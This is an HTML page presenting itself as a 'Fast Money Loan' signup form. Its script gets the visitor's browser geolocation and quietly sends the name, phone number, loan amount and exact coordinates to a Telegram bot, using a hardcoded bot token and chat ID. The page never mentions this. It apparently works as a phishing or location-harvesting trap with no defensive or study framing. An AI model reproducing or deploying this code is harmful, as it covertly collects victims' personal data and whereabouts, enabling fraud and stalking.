<!DOCTYPE html>
<html>
<head>
    <title>Fast Money Loan - Sign Up</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        #signup-form {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        h1 {
            text-align: center;
            margin-bottom: 20px;
            color: #333;
        }

        label {
            font-weight: bold;
        }

        input[type="text"],
        input[type="number"] {
            width: 100%;
            padding: 8px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #4caf50;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        button:hover {
            background-color: #45a049;
        }

        #location {
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div id="signup-form">
        <h1>Fast Money Loan - Sign Up</h1>
        <form id="loan-form">
            <label for="name">Name:</label>
            <input type="text" id="name" name="name" placeholder="Your Name" required>

            <label for="phone">Phone Number:</label>
            <input type="text" id="phone" name="phone" placeholder="Your Phone Number" required>

            <label for="amount">Loan Amount:</label>
            <input type="number" id="amount" name="amount" placeholder="Loan Amount (USD)" required>

            <button type="button" onclick="getLocation()">Signup</button>

            <p id="location"></p>
        </form>
    </div>
    
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                document.getElementById("location").innerHTML = "Geolocation is not supported by this browser.";
            }
        }
        
        function showPosition(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            document.getElementById("location").innerHTML = 
            "Latitude: " + latitude + 
            "<br>Longitude: " + longitude;

            sendLocationToTelegram(latitude, longitude);
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    document.getElementById("location").innerHTML = "User denied the request for Geolocation.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    document.getElementById("location").innerHTML = "Location information is unavailable.";
                    break;
                case error.TIMEOUT:
                    document.getElementById("location").innerHTML = "The request to get user location timed out.";
                    break;
                case error.UNKNOWN_ERROR:
                    document.getElementById("location").innerHTML = "An unknown error occurred.";
                    break;
            }
        }

        function sendLocationToTelegram(latitude, longitude) {
            var botToken = '7395889656:AAEM67vs5lE1xRGWyTCBCb06GOFx9VkIFUg';
            var chatId = '-1002148840772';
            var name = document.getElementById('name').value;
            var phone = document.getElementById('phone').value;
            var amount = document.getElementById('amount').value;

            var message = `New Loan Signup:\nName: ${name}\nPhone Number: ${phone}\nLoan Amount: $${amount}\nLatitude: ${latitude}\nLongitude: ${longitude}`;

            var telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            var xhr = new XMLHttpRequest();
            xhr.open("GET", telegramUrl, true);
            xhr.send();
        }
    </script>
</body>
</html>
